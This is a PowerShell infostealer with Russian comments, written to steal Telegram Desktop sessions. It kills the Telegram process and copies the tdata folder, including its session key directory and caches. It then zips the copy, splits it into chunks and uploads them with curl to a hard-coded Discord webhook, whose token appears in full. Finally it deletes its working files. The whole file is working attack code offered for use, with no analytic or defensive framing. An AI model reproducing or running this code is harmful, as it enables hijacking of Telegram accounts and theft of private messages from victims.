# ===== СКРИПТ ALPHA ДЛЯ ZETA v6.0 - ФИНАЛЬНАЯ ВЕРСИЯ =====
# Вся логика в одном месте, без ебаных багов

$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

# HWID
try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
$workDir = "$env:TEMP\$hwid"
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -Path $workDir -ItemType Directory -Force | Out-Null

Write-Host "[*] Alpha, стартую для HWID: $hwid" -ForegroundColor Cyan

# ============================================================
# ФУНКЦИЯ СОЗДАНИЯ ZIP
# ============================================================
function New-ZipArchive {
    param($SourceFolder, $ZipPath)
    try {
        if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
            Compress-Archive -Path "$SourceFolder\*" -DestinationPath $ZipPath -CompressionLevel Optimal -Force
            return $true
        }
    } catch {}
    try {
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace($ZipPath)
        if (-not $zip) {
            $null = New-Item -Path $ZipPath -ItemType File -Force
            $zip = $shell.NameSpace($ZipPath)
        }
        $items = $shell.NameSpace($SourceFolder).Items()
        $zip.CopyHere($items, 16)
        Start-Sleep -Seconds 2
        return $true
    } catch { return $false }
}

# ============================================================
# ФУНКЦИЯ ОТПРАВКИ - АВТОМАТИЧЕСКИ РЕЖЕТ НА ЧАСТИ
# ============================================================
function Send-LargeFile {
    param($FilePath)
    
    if (-not (Test-Path $FilePath)) { return }
    
    $fileSize = (Get-Item $FilePath).Length
    $sizeMB = $fileSize / 1MB
    
    Write-Host "[*] Обработка файла: $([System.IO.Path]::GetFileName($FilePath)) ($([math]::Round($sizeMB,2)) MB)" -ForegroundColor Yellow
    
    # Если файл меньше 7MB - отправляем целиком
    if ($fileSize -le 7MB) {
        curl.exe -s -F "file=@$FilePath" $webhook
        Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath))" -ForegroundColor Green
        return
    }
    
    # Разбиваем на части по 6MB (с запасом)
    Write-Host "[*] Файл больше 7MB, разбиваю на части..." -ForegroundColor Yellow
    
    $partSize = 6MB
    $totalParts = [math]::Ceiling($fileSize / $partSize)
    $stream = [System.IO.File]::OpenRead($FilePath)
    $buffer = New-Object byte[] $partSize
    
    for ($i = 1; $i -le $totalParts; $i++) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -eq 0) { break }
        
        $partFile = "$env:TEMP\part_$hwid`_$i.bin"
        [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($bytesRead-1)])
        
        $partSizeMB = (Get-Item $partFile).Length / 1MB
        Write-Host "[*] Отправляю часть $i/$totalParts ($([math]::Round($partSizeMB,2)) MB)..." -ForegroundColor Cyan
        
        curl.exe -s -F "file=@$partFile" -F "filename=part_$i" $webhook
        
        Remove-Item $partFile -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    
    $stream.Close()
    Write-Host "[✓] Файл разбит на $totalParts частей и отправлен" -ForegroundColor Green
}

# ============================================================
# БЛОК: TELEGRAM TDATA
# ============================================================
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    Write-Host "[*] Найден Telegram. Закрываю процесс..." -ForegroundColor Yellow
    Get-Process -Name "Telegram*" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    $tgRoot = "$env:TEMP\tg_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force }
    New-Item -Path $tgRoot -ItemType Directory -Force | Out-Null

    # ---- КОПИРУЕМ ВСЁ ----
    
    # 1. D877F783D5D3EF8C
    $d1 = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $d1) {
        $dest = Join-Path $tgRoot "D877F783D5D3EF8C"
        Copy-Item -Path $d1 -Destination $dest -Recurse -Force
        $cnt = (Get-ChildItem -Path $dest -Recurse -File).Count
        Write-Host "[✓] D877F783D5D3EF8C: $cnt файлов" -ForegroundColor Green
    }

    # 2. user_data/cache/номер/
    $cacheRoot = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheRoot) {
        $numDirs = Get-ChildItem -Path $cacheRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 3. user_data/media_cache/номер/
    $mediaRoot = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaRoot) {
        $numDirs = Get-ChildItem -Path $mediaRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "media_cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatamediacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatamediacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 4. Корневые файлы tdata
    $rootFiles = Get-ChildItem -Path $tgPath -File
    if ($rootFiles.Count -gt 0) {
        $counter = 1
        foreach ($f in $rootFiles) {
            $newName = "tdata($counter)"
            $destFile = Join-Path $tgRoot $newName
            Copy-Item -Path $f.FullName -Destination $destFile -Force
            $counter++
        }
        Write-Host "[✓] tdata root: $($rootFiles.Count) файлов" -ForegroundColor Green
    }

    # ---- СОЗДАЁМ АРХИВ ----
    Write-Host "[*] Создаю архив всей tdata..." -ForegroundColor Cyan
    
    $totalSize = (Get-ChildItem -Path $tgRoot -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB
    Write-Host "[*] Общий размер: $([math]::Round($totalSize,2)) MB" -ForegroundColor Yellow
    
    $zipName = "tdata_$hwid.zip"
    $zipPath = "$env:TEMP\$zipName"
    
    if (New-ZipArchive -SourceFolder $tgRoot -ZipPath $zipPath) {
        $zipSize = (Get-Item $zipPath).Length / 1MB
        Write-Host "[✓] Архив создан, размер: $([math]::Round($zipSize,2)) MB" -ForegroundColor Green
        
        # ОТПРАВЛЯЕМ АРХИВ С РАЗБИВКОЙ
        Send-LargeFile -FilePath $zipPath
        
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "[!] Не удалось создать архив, отправляю файлами по отдельности..." -ForegroundColor Red
        $allFiles = Get-ChildItem -Path $tgRoot -Recurse -File
        foreach ($f in $allFiles) {
            if ($f.Length -gt 7MB) {
                # Большие файлы разбиваем
                Send-LargeFile -FilePath $f.FullName
            } else {
                curl.exe -s -F "file=@$($f.FullName)" $webhook
                Write-Host "[✓] Отправлен: $($f.Name)" -ForegroundColor Green
            }
            Start-Sleep -Milliseconds 300
        }
    }

    Remove-Item $tgRoot -Recurse -Force
    Write-Host "[✓] Telegram готов, Alpha!" -ForegroundColor Green
}

# ============================================================
# ФИНАЛ
# ============================================================
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[✓] Всё сделано, Alpha! Архив разбит на части и отправлен." -ForegroundColor Magenta
Write-Host "[*] Чтобы собрать архив обратно, выполни: copy /b part_*.bin tdata.zip" -ForegroundColor Cyan
